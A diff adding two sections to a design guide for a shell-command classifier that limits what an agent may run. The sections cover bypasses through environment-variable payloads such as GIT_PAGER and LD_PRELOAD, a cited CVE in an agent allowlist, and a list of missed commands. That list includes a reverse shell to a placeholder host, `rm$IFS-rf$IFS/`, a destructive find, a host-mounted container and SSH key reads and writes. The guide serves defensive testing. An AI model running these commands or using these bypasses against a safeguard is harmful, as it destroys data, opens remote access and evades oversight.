@@ -210,6 +210,57 @@ cases. The honest sentence is that the floor covers the commands it can read and
 that arbitrary code execution needs an OS-level boundary around the spawned
 process, not a longer list.
 
+### Check the assignment before the verb
+
+The bypass with the best evidence behind it does not hide the verb at all. It puts a
+payload in an environment assignment in front of a command you already allow:
+
+    GIT_PAGER=/tmp/payload.sh git log
+    LD_PRELOAD=/tmp/x.so git status
+    PYTHONSTARTUP=/tmp/x.py python3 -V
+    GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.pager GIT_CONFIG_VALUE_0=/tmp/x.sh git log
+
+CVE-2026-55743 is a shipped desktop agent whose allowlist stripped leading
+`KEY=value` assignments before validating the command, so an allowlisted binary ran
+code the caller chose. If your verb finder skips a word because it contains `=`, you
+have the same hole. Four carriers are worth covering at minimum: the loader and
+runtime hooks, your VCS program slots, the shell's own startup variables, and the
+pager hooks. The last one needs a scan of the raw command rather than of the split
+segments, because `LESSOPEN='|/tmp/x.sh %s' less file` holds a pipe in its value and
+a splitter will cut the assignment in half.
+
+Do not block assignments wholesale. The same CVE rule publishes its benign examples
+and they are ordinary: `TZ=UTC git log` and `NODE_ENV=production npm test`. Require
+both a carrier name and a value that looks executable, so `GIT_PAGER=cat` and
+`EDITOR=vim` stay allowed. A rule that asks for a card on every environment variable
+gets turned off, and then it protects nothing.
+
+Accept: an assignment carrying a path to a script or a shared object is refused, and
+a benign assignment is not.
+
+### Do not trust the verb list you wrote first
+
+Two probe batteries against the built classifier found 42 commands out of 45 that were
+silently allowed, in a file that had already been through a bypass round and was
+believed to be finished. The families it missed were privilege wrappers nobody thinks
+of as wrappers (`su`, `pkexec`, `systemd-run`, `nsenter`, `unshare`, `script`,
+`watch`, `parallel`), a leading backslash (`\rm`), the shell's own field separator
+(`rm$IFS-rf$IFS/`), a delete with no delete verb in front (`find / -exec rm -rf {} +`),
+a network channel with no network verb (`bash -i >& /dev/tcp/host/port`), and a
+container started with the host mounted in (`docker run -v /:/host`).
+
+Write the battery before you believe the table. Feed it the commands you expect to be
+caught and a second list of near-misses you expect to stay ordinary, and require both
+halves to pass. Every fix this round produced was checked against the near-miss half,
+and two of them failed it: a block-device rule that matched any `/dev/` prefix called
+`dd of=/dev/null` a reformat, and a write-detection guard added for
+`echo key > ~/.ssh/authorized_keys` turned `cat ~/.ssh/id_ed25519 2>/dev/null` into a
+false negative, because a redirect anywhere on the line says nothing about where
+standard output goes.
+
+Accept: a checked-in probe list with both halves, and a recorded count of what it
+caught before and after.
+
 Accept: the limitation is written down where a porter will read it before claiming
 more than the classifier delivers.
 
